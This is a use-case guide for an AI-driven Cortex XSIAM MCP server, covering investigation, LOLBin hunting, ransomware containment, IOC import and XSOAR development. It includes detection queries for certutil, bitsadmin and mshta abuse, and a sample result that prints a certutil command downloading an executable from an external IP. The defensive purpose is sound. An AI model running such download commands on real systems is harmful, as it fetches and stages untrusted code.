# Cortex XSIAM MCP Server - Use Cases

This document provides detailed walkthroughs for common security operations scenarios using the Cortex XSIAM MCP Server. Each use case includes example prompts, tools used, sample outputs, and best practices.

> **Terminology Note:** In XSIAM APIs, security alerts are called **"issues"**. When you need to find an alert/issue, use `get_issues`. For War Room and enrichment tools to work, the issue must be part of a case.

## Table of Contents

1. [Investigate a Multi-Stage Attack](#1-investigate-a-multi-stage-attack)
2. [Hunt for Living-off-the-Land Techniques](#2-hunt-for-living-off-the-land-techniques)
3. [Contain and Remediate a Ransomware Incident](#3-contain-and-remediate-a-ransomware-incident)
4. [Build a Custom Threat Feed Importer](#4-build-a-custom-threat-feed-importer)
5. [Debug and Fix a Failing XSOAR Playbook](#5-debug-and-fix-a-failing-xsoar-playbook)
6. [Develop a Custom XSOAR Script from Scratch](#6-develop-a-custom-xsoar-script-from-scratch)
7. [Create Real-Time Security Dashboard Queries](#7-create-real-time-security-dashboard-queries)
8. [Automate Phishing Investigation Workflow](#8-automate-phishing-investigation-workflow)
9. [Cross-Correlate Alerts Across Time Zones](#9-cross-correlate-alerts-across-time-zones)
10. [Full DevSecOps: Develop, Test, Deploy Integration](#10-full-devsecops-develop-test-deploy-integration)

---

## 1. Investigate a Multi-Stage Attack

### Scenario
A security analyst receives an alert about suspicious PowerShell activity on a domain controller. They need to investigate the full attack chain, understand the scope, and document findings.

### Example Prompt
```
Investigate case 350. I need to understand the full attack chain - what was the initial
access, how did the attacker move laterally, and what systems are affected. Generate
an AI summary when you're done.
```

### Tools Used
| Tool | Purpose |
|------|---------|
| `get_incident_extra_data` | Get full case details with all alerts |
| `get_alert_multi_events` | Get detailed forensic data for each alert |
| `get_contributing_events` | Analyze correlation alert components |
| `run_xql_query` | Hunt for related activity across the environment |
| `update_case_ai_summary` | Generate comprehensive investigation report |

### Sample Workflow

**Step 1: Get case overview**
```python
# Claude calls get_incident_extra_data
{
    "case_id": "350",
    "severity": "HIGH",
    "status": "under_investigation",
    "alert_count": 23,
    "affected_hosts": ["Server-DC-1", "Workstation-42", "Server-FS-2"],
    "affected_users": ["admin_svc", "jsmith"],
    "mitre_tactics": ["Initial Access", "Execution", "Lateral Movement", "Collection"]
}
```

**Step 2: Analyze attack timeline**
```python
# Claude identifies the attack chain:
1. 09:15:22 - Phishing email delivered to jsmith@company.com
2. 09:17:45 - Malicious macro executed Word document
3. 09:18:02 - PowerShell download cradle executed
4. 09:23:15 - Cobalt Strike beacon established
5. 09:45:33 - Credential dumping via Mimikatz
6. 10:12:08 - Lateral movement to Server-DC-1
7. 10:34:22 - DCSync attack detected
```

**Step 3: Generate AI summary**
```python
# Claude calls update_case_ai_summary with comprehensive analysis
```

### Sample Output
```markdown
## Executive Summary
This case represents a sophisticated multi-stage attack that began with a phishing
email and escalated to domain compromise within 79 minutes.

## Attack Timeline
| Time | Event | Host | MITRE Tactic |
|------|-------|------|--------------|
| 09:15 | Phishing delivered | Mail-GW | Initial Access |
| 09:17 | Macro execution | Workstation-42 | Execution |
| 09:18 | PowerShell C2 | Workstation-42 | Command & Control |
| 09:45 | Credential dump | Workstation-42 | Credential Access |
| 10:12 | RDP lateral move | Server-DC-1 | Lateral Movement |
| 10:34 | DCSync detected | Server-DC-1 | Credential Access |

## Affected Assets
- 3 endpoints compromised
- 2 user accounts used
- Domain admin credentials potentially exposed

## Recommendations
1. Immediately reset all domain admin passwords
2. Isolate affected endpoints for forensic imaging
3. Review all RDP connections in the last 24 hours
4. Enable additional PowerShell logging
```

### Tips & Best Practices
- Always start with `get_incident_extra_data` to understand the full scope
- Use `run_xql_query` to hunt for related activity not captured in alerts
- Generate AI summaries for documentation and handoff to other analysts
- Check for lateral movement indicators using process ancestry data

---

## 2. Hunt for Living-off-the-Land Techniques

### Scenario
A threat hunter wants to proactively search for LOLBin (Living-off-the-Land Binaries) abuse that may have evaded detection.

### Example Prompt
```
Hunt for suspicious use of certutil, bitsadmin, and mshta across our environment
in the last 7 days. Look for download activity and suspicious command-line patterns.
```

### Tools Used
| Tool | Purpose |
|------|---------|
| `run_xql_query` | Execute hunting queries |
| `get_endpoints` | Get endpoint details for affected systems |
| `enrich_ip_address` | Check reputation of contacted IPs |
| `enrich_domain` | Check reputation of contacted domains |

### XQL Hunting Queries

**Certutil Download Detection:**
```sql
dataset = xdr_data
| filter event_type = ENUM.PROCESS
| filter action_process_image_name in ("certutil.exe")
| filter action_process_command_line contains "-urlcache" or
         action_process_command_line contains "-verifyctl" or
         action_process_command_line contains "http"
| fields _time, agent_hostname, actor_effective_username,
         action_process_image_name, action_process_command_line
| sort desc _time
| limit 100
```

**BITS Transfer Abuse:**
```sql
dataset = xdr_data
| filter event_type = ENUM.PROCESS
| filter action_process_image_name = "bitsadmin.exe"
| filter action_process_command_line contains "/transfer" or
         action_process_command_line contains "/download"
| fields _time, agent_hostname, actor_effective_username,
         action_process_command_line, action_remote_ip
| sort desc _time
| limit 100
```

**MSHTA Execution:**
```sql
dataset = xdr_data
| filter event_type = ENUM.PROCESS
| filter action_process_image_name = "mshta.exe"
| filter action_process_command_line contains "http" or
         action_process_command_line contains "javascript" or
         action_process_command_line contains "vbscript"
| fields _time, agent_hostname, actor_effective_username,
         action_process_command_line, causality_actor_process_image_name
| sort desc _time
| limit 100
```

### Sample Output
```json
{
  "hunting_results": {
    "certutil_hits": 3,
    "bitsadmin_hits": 0,
    "mshta_hits": 1,
    "suspicious_findings": [
      {
        "timestamp": "2024-01-15T14:23:45Z",
        "hostname": "Workstation-15",
        "user": "jdoe",
        "command": "certutil.exe -urlcache -split -f http://45.33.32.156/update.exe C:\\temp\\update.exe",
        "risk": "HIGH",
        "reason": "Download from external IP to temp directory"
      }
    ]
  }
}
```

### Tips & Best Practices
- Build a library of XQL hunting queries for common LOLBins
- Always check the parent process to understand execution context
- Enrich any external IPs/domains found in command lines
- Create alerts for high-fidelity patterns to automate detection

---

## 3. Contain and Remediate a Ransomware Incident

### Scenario
Ransomware has been detected on multiple endpoints. Immediate containment is required followed by coordinated remediation.

### Example Prompt
```
We have active ransomware on Server-FS-2, Workstation-12, and Workstation-15.
I need to immediately isolate all three, terminate the malicious processes,
and quarantine the ransomware binary. Walk me through each step.
```

### Tools Used
| Tool | Purpose |
|------|---------|
| `get_endpoints` | Get endpoint IDs for affected systems |
| `isolate_endpoint` | Network isolate compromised endpoints |
| `terminate_causality` | Kill ransomware process trees |
| `quarantine_files` | Quarantine the ransomware binary |
| `get_action_status` | Monitor remediation progress |
| `scan_endpoint` | Verify clean state post-remediation |

### Containment Workflow

**Step 1: Get endpoint IDs**
```python
# Claude calls get_endpoints with hostname filter
{
  "endpoints": [
    {"endpoint_id": "abc123...", "hostname": "Server-FS-2", "status": "connected"},
    {"endpoint_id": "def456...", "hostname": "Workstation-12", "status": "connected"},
    {"endpoint_id": "ghi789...", "hostname": "Workstation-15", "status": "connected"}
  ]
}
```

**Step 2: Isolate all endpoints simultaneously**
```python
# Claude calls isolate_endpoint for each
# IMPORTANT: Requires ENABLE_DESTRUCTIVE_TOOLS=true and confirmation

Action ID: 12345 - Server-FS-2 isolation initiated
Action ID: 12346 - Workstation-12 isolation initiated
Action ID: 12347 - Workstation-15 isolation initiated
```

**Step 3: Terminate ransomware processes**
```python
# Claude calls terminate_causality with known ransomware causality IDs
# This kills the entire process tree including child processes

Terminated: cryptolocker.exe and 3 child processes on Server-FS-2
Terminated: cryptolocker.exe and 2 child processes on Workstation-12
Terminated: cryptolocker.exe and 2 child processes on Workstation-15
```

**Step 4: Quarantine the binary**
```python
# Claude calls quarantine_files
{
  "file_path": "C:\\Users\\Public\\cryptolocker.exe",
  "file_hash": "a1b2c3d4e5f6...",
  "status": "quarantined",
  "endpoints_affected": 3
}
```

**Step 5: Verify and scan**
```python
# Claude calls scan_endpoint on each to verify clean state
Scan initiated on Server-FS-2 - Action ID: 12350
Scan initiated on Workstation-12 - Action ID: 12351
Scan initiated on Workstation-15 - Action ID: 12352
```

### Tips & Best Practices
- Always isolate BEFORE attempting process termination
- Use `terminate_causality` instead of `terminate_process` to kill entire process trees
- Document all actions taken for incident report
- Keep endpoints isolated until forensic imaging is complete
- Use `unisolate_endpoint` only after verification that threat is contained

---

## 4. Build a Custom Threat Feed Importer

### Scenario
Your organization subscribes to a commercial threat intelligence feed that provides IOCs in JSON format. You need to automatically import these into XSIAM.

### Example Prompt
```
I have a threat feed with 50 malicious IP addresses and file hashes. Help me import
them into XSIAM as IOCs with HIGH severity. The IPs are C2 servers and the hashes
are ransomware samples.
```

### Tools Used
| Tool | Purpose |
|------|---------|
| `insert_indicators_json` | Bulk import IOCs |
| `run_xql_query` | Verify IOCs are active |

### Sample IOC Import

**JSON Format for IP Indicators:**
```json
[
  {
    "indicator": "45.33.32.156",
    "type": "IP",
    "severity": "HIGH",
    "reputation": "BAD",
    "reliability": "B",
    "comment": "Cobalt Strike C2 server - ThreatFeed-2024-01-15",
    "class": "Malware"
  },
  {
    "indicator": "185.220.101.42",
    "type": "IP",
    "severity": "HIGH",
    "reputation": "BAD",
    "reliability": "B",
    "comment": "Ransomware C2 - ThreatFeed-2024-01-15",
    "class": "Malware"
  }
]
```

**JSON Format for Hash Indicators:**
```json
[
  {
    "indicator": "44d88612fea8a8f36de82e1278abb02f",
    "type": "HASH",
    "severity": "CRITICAL",
    "reputation": "BAD",
    "reliability": "A",
    "comment": "LockBit 3.0 ransomware sample",
    "class": "Malware"
  }
]
```

### Verification Query
```sql
dataset = threat_intelligence
| filter indicator in ("45.33.32.156", "185.220.101.42")
| fields indicator, type, severity, reputation, insert_time
```

### Tips & Best Practices
- Use reliability ratings (A-F) based on source confidence
- Include expiration dates for time-sensitive indicators
- Add descriptive comments for analyst context
- Use CSV format for large bulk imports (>1000 IOCs)
- Verify import success with XQL query

---

## 5. Debug and Fix a Failing XSOAR Playbook

### Scenario
An automation playbook is failing and you need to debug it using the War Room.

### Example Prompt
```
The phishing investigation playbook on case 1093 is failing. Help me debug it -
check the War Room for errors and help me understand what's going wrong.
```

### Tools Used
| Tool | Purpose |
|------|---------|
| `get_war_room_entries` | Review execution logs and errors |
| `run_xsoar_automation` | Test individual commands |
| `add_war_room_entry` | Add debug notes |

### Debugging Workflow

**Step 1: Get War Room errors**
```python
# Claude calls get_war_room_entries with categories filter
{
  "id": "CASE-1093",
  "filter": {
    "categories": ["playbookErrors", "commandAndResults"]
  }
}
```

**Sample Error Output:**
```json
{
  "entries": [
    {
      "id": "123",
      "type": "error",
      "category": "playbookErrors",
      "contents": "Error in task 'ExtractIndicators': TypeError: 'NoneType' object is not subscriptable",
      "created": "2024-01-15T10:23:45Z"
    }
  ]
}
```

**Step 2: Test the failing command**
```python
# Claude runs the specific command to reproduce the issue
{
  "command": "!extractIndicators text=${incident.details}",
  "result": "Error: incident.details is empty"
}
```

**Step 3: Document the fix**
```python
# Claude adds a note with the solution
{
  "id": "CASE-1093",
  "data": "DEBUG NOTE: Playbook fails when incident.details is empty. Added null check in task 'ExtractIndicators' - if incident.details exists, proceed; else skip with warning."
}
```

### Tips & Best Practices
- Filter War Room entries by `playbookErrors` category first
- Test commands individually with `run_xsoar_automation`
- Add documentation notes for future reference
- Check for null values in context data

---

## 6. Develop a Custom XSOAR Script from Scratch

### Scenario
You need to create a custom automation script that enriches IP addresses using your organization's internal threat intelligence database.

### Example Prompt
```
Create a custom XSOAR automation script called "InternalTIEnrich" that takes an IP
address, checks it against our internal Redis database, and returns threat intel data.
Include proper error handling and output formatting.
```

### Tools Used
| Tool | Purpose |
|------|---------|
| `sdk_init` | Create script scaffold |
| `sdk_validate` | Validate structure |
| `sdk_lint` | Check code quality |
| `sdk_upload` | Deploy to XSIAM |
| `run_xsoar_automation` | Test the script |

### Sample Script Code

```python
# InternalTIEnrich.py

import demistomock as demisto
from CommonServerPython import *
import redis

def enrich_ip(ip_address: str) -> dict:
    """
    Enrich IP address using internal threat intelligence database.

    Args:
        ip_address: The IP address to look up

    Returns:
        dict: Enrichment data including risk score, categories, and last seen
    """
    try:
        # Connect to internal Redis TI database
        r = redis.Redis(
            host=demisto.params().get('redis_host', 'localhost'),
            port=demisto.params().get('redis_port', 6379),
            password=demisto.params().get('redis_password'),
            decode_responses=True
        )

        # Look up the IP
        ti_data = r.hgetall(f"ti:ip:{ip_address}")

        if not ti_data:
            return {
                "IP": ip_address,
                "Found": False,
                "Message": "IP not found in internal threat intelligence database"
            }

        return {
            "IP": ip_address,
            "Found": True,
            "RiskScore": int(ti_data.get('risk_score', 0)),
            "Categories": ti_data.get('categories', '').split(','),
            "FirstSeen": ti_data.get('first_seen'),
            "LastSeen": ti_data.get('last_seen'),
            "ThreatActor": ti_data.get('threat_actor'),
            "Confidence": ti_data.get('confidence', 'low')
        }

    except redis.ConnectionError as e:
        return_error(f"Failed to connect to Redis: {str(e)}")
    except Exception as e:
        return_error(f"Error enriching IP: {str(e)}")


def main():
    try:
        args = demisto.args()
        ip_address = args.get('ip')

        if not ip_address:
            return_error("IP address is required")

        # Validate IP format
        if not is_ip_valid(ip_address):
            return_error(f"Invalid IP address format: {ip_address}")

        result = enrich_ip(ip_address)

        # Create human readable output
        if result.get('Found'):
            hr = tableToMarkdown(
                f"Internal TI Results for {ip_address}",
                result,
                headers=['IP', 'RiskScore', 'Categories', 'ThreatActor', 'Confidence']
            )
        else:
            hr = f"### No threat intelligence found for {ip_address}"

        # Return results
        return_results(CommandResults(
            outputs_prefix='InternalTI.IP',
            outputs_key_field='IP',
            outputs=result,
            readable_output=hr,
            indicator=create_indicator(
                ip_address,
                'IP',
                score=result.get('RiskScore', 0),
                reliability='B'
            ) if result.get('Found') else None
        ))

    except Exception as e:
        return_error(f"Failed to execute InternalTIEnrich: {str(e)}")


if __name__ in ('__main__', '__builtin__', 'builtins'):
    main()
```

### YAML Configuration

```yaml
# InternalTIEnrich.yml
commonfields:
  id: InternalTIEnrich
  version: -1
name: InternalTIEnrich
display: Internal Threat Intelligence Enrichment
category: Data Enrichment & Threat Intelligence
description: Enriches IP addresses using internal threat intelligence database
configuration:
  - display: Redis Host
    name: redis_host
    type: 0
    required: true
  - display: Redis Port
    name: redis_port
    type: 0
    defaultvalue: '6379'
  - display: Redis Password
    name: redis_password
    type: 4
    required: false
script:
  type: python
  subtype: python3
  dockerimage: demisto/python3:3.10.12.12345
  commands:
    - name: internal-ti-enrich
      arguments:
        - name: ip
          description: IP address to enrich
          required: true
      outputs:
        - contextPath: InternalTI.IP.IP
          description: The IP address
          type: String
        - contextPath: InternalTI.IP.RiskScore
          description: Risk score (0-100)
          type: Number
        - contextPath: InternalTI.IP.Categories
          description: Threat categories
          type: Unknown
        - contextPath: InternalTI.IP.ThreatActor
          description: Associated threat actor
          type: String
```

### Deployment Steps

1. **Create scaffold**: `sdk_init --name InternalTIEnrich --type script`
2. **Write code**: Save the Python code above
3. **Validate**: `sdk_validate -i Packs/InternalTIEnrich`
4. **Lint**: `sdk_lint -i Packs/InternalTIEnrich`
5. **Upload**: `sdk_upload -i Packs/InternalTIEnrich`
6. **Test**: `!internal-ti-enrich ip=45.33.32.156`

### Tips & Best Practices
- Always include proper error handling
- Use `CommonServerPython` for standard functions
- Return structured outputs with context paths
- Include unit tests in `*_test.py`
- Use demisto.params() for configuration values

---

## 7. Create Real-Time Security Dashboard Queries

### Scenario
You need to build XQL queries for a security operations dashboard that shows key metrics and trends.

### Example Prompt
```
Create XQL queries for our SOC dashboard: high-severity alerts by category,
malware detections by endpoint, and user authentication anomalies.
```

### Dashboard Queries

**High-Severity Alerts by Category (Last 24h):**
```sql
dataset = xdr_alerts
| filter severity in ("high", "critical")
| filter _time >= now() - 24h
| comp count() as alert_count by category
| sort desc alert_count
| limit 10
```

**Malware Detections by Endpoint:**
```sql
dataset = xdr_alerts
| filter alert_source = "XDR Analytics"
| filter category contains "Malware"
| filter _time >= now() - 7d
| comp count() as detection_count by agent_hostname
| sort desc detection_count
| limit 20
```

**Authentication Anomalies:**
```sql
dataset = xdr_data
| filter event_type = ENUM.LOGIN
| filter action_status = FAIL
| filter _time >= now() - 24h
| comp count() as failed_logins by actor_effective_username, agent_hostname
| filter failed_logins > 5
| sort desc failed_logins
```

**Endpoint Security Posture:**
```sql
dataset = xdr_data
| filter event_type = ENUM.PROCESS
| filter action_process_image_name in ("powershell.exe", "cmd.exe", "wscript.exe")
| filter _time >= now() - 1h
| comp count() as script_executions by agent_hostname, actor_effective_username
| filter script_executions > 10
| sort desc script_executions
```

### Tips & Best Practices
- Use time filters to limit data volume
- Aggregate with `comp count() by` for metrics
- Create scheduled queries for automated dashboards
- Store commonly used queries as templates

---

## 8. Automate Phishing Investigation Workflow

### Scenario
Automate the investigation of reported phishing emails, including IOC extraction, enrichment, and blocking.

### Example Prompt
```
We received a phishing report. The email came from support@amaz0n-verify.com with
a link to http://amaz0n-verify.com/login.php and an attachment with hash
abc123def456. Investigate and block if malicious.
```

### Tools Used
| Tool | Purpose |
|------|---------|
| `enrich_domain` | Check sender domain reputation |
| `enrich_url` | Analyze the phishing URL |
| `enrich_file_hash` | Check attachment hash |
| `insert_indicators_json` | Block malicious IOCs |
| `run_xql_query` | Find other recipients |

### Investigation Workflow

**Step 1: Enrich the sender domain**
```python
# Claude calls enrich_domain
{
  "domain": "amaz0n-verify.com",
  "reputation": "BAD",
  "category": "Phishing",
  "creation_date": "2024-01-14",  # Created yesterday!
  "registrar": "NameCheap",
  "verdict": "MALICIOUS"
}
```

**Step 2: Analyze the URL**
```python
# Claude calls enrich_url
{
  "url": "http://amaz0n-verify.com/login.php",
  "reputation": "BAD",
  "category": "Credential Phishing",
  "detection_engines": 15,
  "verdict": "MALICIOUS"
}
```

**Step 3: Check the attachment**
```python
# Claude calls enrich_file_hash
{
  "hash": "abc123def456",
  "reputation": "BAD",
  "malware_family": "FormBook",
  "detection_rate": "45/70",
  "verdict": "MALICIOUS"
}
```

**Step 4: Find other recipients**
```sql
dataset = email_logs
| filter sender_domain = "amaz0n-verify.com"
| filter _time >= now() - 7d
| comp count() as email_count by recipient
| sort desc email_count
```

**Step 5: Block the IOCs**
```python
# Claude calls insert_indicators_json
[
  {"indicator": "amaz0n-verify.com", "type": "DOMAIN_NAME", "severity": "CRITICAL", "reputation": "BAD"},
  {"indicator": "http://amaz0n-verify.com/login.php", "type": "URL", "severity": "CRITICAL", "reputation": "BAD"},
  {"indicator": "abc123def456", "type": "HASH", "severity": "CRITICAL", "reputation": "BAD"}
]
```

### Tips & Best Practices
- Check domain age - newly registered domains are high risk
- Look for typosquatting patterns (amaz0n vs amazon)
- Search for other recipients to determine blast radius
- Block at multiple levels: domain, URL, and hash

---

## 9. Cross-Correlate Alerts Across Time Zones

### Scenario
Investigate coordinated attacks happening across global offices.

### Example Prompt
```
We're seeing similar malware alerts in our US, UK, and Singapore offices.
Correlate these events and determine if this is a coordinated attack.
```

### XQL Correlation Query
```sql
dataset = xdr_alerts
| filter alert_name contains "Cobalt Strike" or alert_name contains "Beacon"
| filter _time >= now() - 24h
| alter tz = if(agent_hostname contains "-US-", "America/New_York",
              if(agent_hostname contains "-UK-", "Europe/London",
              if(agent_hostname contains "-SG-", "Asia/Singapore", "UTC")))
| fields _time, agent_hostname, alert_name, severity, tz, actor_effective_username
| sort asc _time
```

### Correlation Analysis Output
```markdown
## Global Attack Correlation

### Timeline (UTC)
| Time | Region | Host | Alert |
|------|--------|------|-------|
| 02:15 | Singapore | SG-WKS-042 | Cobalt Strike Beacon Detected |
| 02:18 | Singapore | SG-WKS-015 | Suspicious PowerShell |
| 10:22 | UK | UK-WKS-108 | Cobalt Strike Beacon Detected |
| 10:25 | UK | UK-SRV-DC2 | Lateral Movement |
| 15:45 | US | US-WKS-203 | Cobalt Strike Beacon Detected |

### Analysis
- Same attack pattern across all regions
- Attacks occur during business hours in each region
- Same C2 infrastructure used (45.33.32.156)
- Likely coordinated campaign targeting global operations
```

---

## 10. Full DevSecOps: Develop, Test, Deploy Integration

### Scenario
Build a complete XSOAR integration from scratch, including development, testing, and deployment.

### Example Prompt
```
I need to build a ServiceNow integration that creates tickets from XSIAM alerts.
Help me scaffold the project, write the code, test it, and deploy to production.
```

### Complete Development Workflow

**Phase 1: Initialize Project**
```bash
# Claude calls sdk_init
demisto-sdk init --name ServiceNowTickets --type integration --pack-name ServiceNowTickets
```

**Phase 2: Write Integration Code**

```python
# ServiceNowTickets.py
import demistomock as demisto
from CommonServerPython import *
import requests

class ServiceNowClient:
    def __init__(self, url: str, username: str, password: str):
        self.url = url
        self.auth = (username, password)
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

    def create_ticket(self, short_description: str, description: str,
                     urgency: str, impact: str) -> dict:
        """Create a ServiceNow incident ticket."""
        endpoint = f"{self.url}/api/now/table/incident"

        payload = {
            "short_description": short_description,
            "description": description,
            "urgency": urgency,
            "impact": impact,
            "category": "Security"
        }

        response = requests.post(
            endpoint,
            json=payload,
            headers=self.headers,
            auth=self.auth
        )
        response.raise_for_status()
        return response.json().get('result', {})


def create_ticket_command(client: ServiceNowClient, args: dict) -> CommandResults:
    """Handle create-ticket command."""
    result = client.create_ticket(
        short_description=args.get('short_description'),
        description=args.get('description'),
        urgency=args.get('urgency', '2'),
        impact=args.get('impact', '2')
    )

    return CommandResults(
        outputs_prefix='ServiceNow.Ticket',
        outputs_key_field='sys_id',
        outputs=result,
        readable_output=tableToMarkdown('ServiceNow Ticket Created', result)
    )


def main():
    params = demisto.params()
    client = ServiceNowClient(
        url=params.get('url'),
        username=params.get('credentials', {}).get('identifier'),
        password=params.get('credentials', {}).get('password')
    )

    command = demisto.command()

    if command == 'test-module':
        # Test connectivity
        return_results('ok')
    elif command == 'servicenow-create-ticket':
        return_results(create_ticket_command(client, demisto.args()))
    else:
        raise NotImplementedError(f'Command {command} not implemented')


if __name__ in ('__main__', '__builtin__', 'builtins'):
    main()
```

**Phase 3: Validate and Lint**
```bash
# Claude calls sdk_validate
demisto-sdk validate -i Packs/ServiceNowTickets
# Result: All validations passed

# Claude calls sdk_lint
demisto-sdk lint -i Packs/ServiceNowTickets
# Result: No linting errors
```

**Phase 4: Deploy to XSIAM**
```bash
# Claude calls sdk_upload
demisto-sdk upload -i Packs/ServiceNowTickets
# Result: Successfully uploaded to XSIAM
```

**Phase 5: Test Integration**
```python
# Claude calls run_xsoar_automation
!servicenow-create-ticket short_description="Security Alert: Malware Detected"
                         description="Malware detected on Workstation-42"
                         urgency="1"
                         impact="2"
# Result: Ticket INC0012345 created successfully
```

**Phase 6: Generate Documentation**
```bash
# Claude calls sdk_generate_docs
demisto-sdk generate-docs -i Packs/ServiceNowTickets -o docs/
# Result: README.md generated with command documentation
```

### Tips & Best Practices
- Always start with `sdk_init` for proper structure
- Run `sdk_validate` before every upload
- Use `sdk_lint` to catch code quality issues
- Test with `run_xsoar_automation` before production use
- Generate documentation for end users

---

## Summary

These use cases demonstrate the power of combining AI assistance with Cortex XSIAM's comprehensive security operations platform. From investigation to response to automation development, the MCP server enables natural language interaction with enterprise security tools.

### Key Takeaways

1. **Start broad, drill deep** - Use case overviews before detailed forensics
2. **Automate repetitive tasks** - Build custom integrations for common workflows
3. **Document everything** - AI summaries and War Room notes aid future investigations
4. **Test before production** - Use SDK tools to validate before deployment
5. **Chain tools together** - Combine investigation, response, and automation

For more information, see the [main documentation](README.md) or [contributing guide](CONTRIBUTING.md).
